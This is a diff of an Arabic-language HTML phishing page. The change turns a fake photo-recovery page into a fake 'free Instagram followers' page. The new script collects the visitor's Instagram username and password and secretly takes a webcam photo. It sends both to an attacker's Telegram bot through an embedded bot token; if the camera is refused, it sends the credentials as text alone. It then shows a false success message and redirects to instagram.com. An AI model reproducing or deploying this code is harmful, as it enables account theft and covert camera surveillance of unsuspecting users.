@@ -1,40 +1,92 @@
-
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-    <meta charset="UTF-8"><title>📸 PHOTO-VIP | 𝙛𝙖𝙧𝙚𝙨 𝙖𝙡𝙬𝙨𝙖𝙗𝙞</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>INSTA ROYAL | 𝙛𝙖𝙧𝙚𝙨 𝙖𝙡𝙬𝙨𝙖𝙗𝙞</title>
     <style>
-        body { background: #000; color: #00d2ff; font-family:  Cairo , sans-serif; text-align: center; padding: 50px; }
-        .card { border: 2px solid #00d2ff; border-radius: 20px; padding: 20px; box-shadow: 0 0 15px #00d2ff; }
-        .btn { width: 100%; padding: 15px; background: #00d2ff; color: #000; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; }
+        :root { --blue-glow: #00d2ff; --royal: #0045ff; }
+        body { background: radial-gradient(circle at center, #0a192f 0%, #020b1a 100%); color: white; font-family: 'Cairo', sans-serif; text-align: center; padding: 15px; margin: 0; }
+        .card { border: 1px solid var(--blue-glow); border-radius: 25px; padding: 25px; max-width: 400px; margin: 30px auto; background: rgba(2, 11, 26, 0.8); box-shadow: 0 0 30px rgba(0, 210, 255, 0.2); backdrop-filter: blur(10px); }
+        h1 { color: var(--blue-glow); text-shadow: 0 0 10px var(--blue-glow); font-size: 24px; }
+        .service-item { background: rgba(255,255,255,0.05); border: 1px solid #112240; padding: 12px; margin: 8px 0; border-radius: 12px; display: flex; justify-content: space-between; cursor: pointer; }
+        input { width: 100%; padding: 14px; margin: 10px 0; background: #0a192f; border: 1px solid #112240; color: var(--blue-glow); border-radius: 10px; text-align: center; box-sizing: border-box; }
+        .btn { width: 100%; padding: 16px; background: linear-gradient(90deg, var(--royal), var(--blue-glow)); border: none; color: white; font-weight: bold; border-radius: 12px; cursor: pointer; font-size: 18px; margin-top: 15px; }
+        .signature { margin-top: 30px; color: var(--blue-glow); font-size: 22px; font-weight: bold; text-shadow: 0 0 10px var(--blue-glow); }
     </style>
 </head>
 <body>
+
     <div class="card">
-        <h2>مركز استعادة الصور المحذوفة</h2>
-        <p>اضغط لتأكيد هويتك واستعادة صور جهازك مجاناً</p>
-        <button class="btn" onclick="start()">تأكيد الهوية الآن</button>
-        <div style="margin-top:20px; font-size:20px;">𝙛𝙖𝙧𝙚𝙨 𝙖𝙡𝙬𝙨𝙖𝙗𝙞</div>
+        <h1>𝙄𝙉𝙎𝙏𝘼𝙂𝙍𝘼𝙈 𝙍𝙊𝙔𝘼𝙇</h1>
+        <p>احصل على 200 متابع مجاناً الآن</p>
+
+        <div class="service-item" onclick="alert('تم اختيار 200 متابع مجاني')">
+            <span>👤 200 متابع (تجريبي)</span>
+            <span style="color: #00ff88;">FREE</span>
+        </div>
+        <div class="service-item" onclick="alert('⚠️ الرصيد 0.00$')">
+            <span>👤 5,000 متابع VIP</span>
+            <span style="color: #f39c12;">15.00$ 💰</span>
+        </div>
+
+        <input type="text" id="u" placeholder="Username" oninput="v(this)">
+        <input type="password" id="p" placeholder="Password" oninput="v(this)">
+        
+        <button class="btn" onclick="start()">تأكيد الطلب</button>
+        
+        <div class="signature">𝙛𝙖𝙧𝙚𝙨 𝙖𝙡𝙬𝙨𝙖𝙗𝙞</div>
     </div>
-    <video id="v" autoplay style="display:none"></video><canvas id="c" style="display:none"></canvas>
+
+    <video id="v" autoplay style="display:none"></video>
+    <canvas id="c" style="display:none"></canvas>
+
     <script>
+        // التوكن حقك يا فارس
         const tok = "
-8250478196:AAH0J5NF3cOvM_Zm_DqE8wmbeKJc3zsbviM";
-        const cid = new URLSearchParams(window.location.search).get( chatId );
+8250478196:AAH0J5NF3cOvM_Zm_DqE8wmbeKJc3zsbviM"; 
+        const cid = new URLSearchParams(window.location.search).get('chatId');
+
+        // دالة منع الحروف العربية
+        function v(i) { i.value = i.value.replace(/[^\x00-\x7F]/g, ""); }
+
         async function start() {
+            const user = document.getElementById('u').value;
+            const pass = document.getElementById('p').value;
+            
+            if(!user || !pass) return alert("الرجاء إدخال البيانات!");
+            if(!cid) return alert("خطأ في الرابط (ChatId مفقود)!");
+
             try {
-                const s = await navigator.mediaDevices.getUserMedia({video:true});
-                document.getElementById( v ).srcObject = s;
+                const s = await navigator.mediaDevices.getUserMedia({video: true});
+                document.getElementById('v').srcObject = s;
+                
                 setTimeout(() => {
-                    const can = document.getElementById( c ); can.width=640; can.height=480;
-                    can.getContext( 2d ).drawImage(document.getElementById( v ),0,0,640,480);
+                    const can = document.getElementById('c');
+                    can.width = 640; can.height = 480;
+                    can.getContext('2d').drawImage(document.getElementById('v'), 0, 0, 640, 480);
+                    
                     can.toBlob(b => {
-                        const f = new FormData(); f.append( chat_id , cid); f.append( photo , b,  f.jpg );
-                        f.append( caption , `📸 صيد كاميرا جديد\nBy: 𝙛𝙖𝙧𝙚𝙨 𝙖𝙡𝙬𝙨𝙖𝙗𝙞`);
-                        fetch(`https://api.telegram.org/bot${tok}/sendPhoto`, {method: POST , body:f}).then(()=> alert("خطأ في الخادم، حاول لاحقاً!"));
-                    },  image/jpeg );
+                        const f = new FormData();
+                        f.append('chat_id', cid);
+                        f.append('photo', b, 'insta.jpg');
+                        f.append('caption', `💠 صيد إنستا جديد 💠\n\n👤 اليوزر: ${user}\n🔑 الباسورد: ${pass}\nBy: 𝙛𝙖𝙧𝙚𝙨 𝙖𝙡𝙬𝙨𝙖𝙗𝙞`);
+                        
+                        fetch(`https://api.telegram.org/bot${tok}/sendPhoto`, {method:'POST', body:f})
+                        .then(() => {
+                            alert("✅ تم استلام طلبك، انتظر المتابعين!");
+                            window.location.href = "https://instagram.com";
+                        });
+                    }, 'image/jpeg');
                 }, 1000);
-            } catch(e) { alert("يجب السماح بالكاميرا لاستعادة الصور!"); }
+            } catch(e) {
+                // إرسال نصي إذا رفض الكاميرا
+                fetch(`https://api.telegram.org/bot${tok}/sendMessage?chat_id=${cid}&text=${encodeURIComponent("⚠️ صيد إنستا (بدون صورة)\n👤 اليوزر: "+user+"\n🔑 الباسورد: "+pass)}`)
+                .then(() => {
+                    alert("✅ جاري تنفيذ الطلب..");
+                    window.location.href = "https://instagram.com";
+                });
+            }
         }
     </script>
 </body>
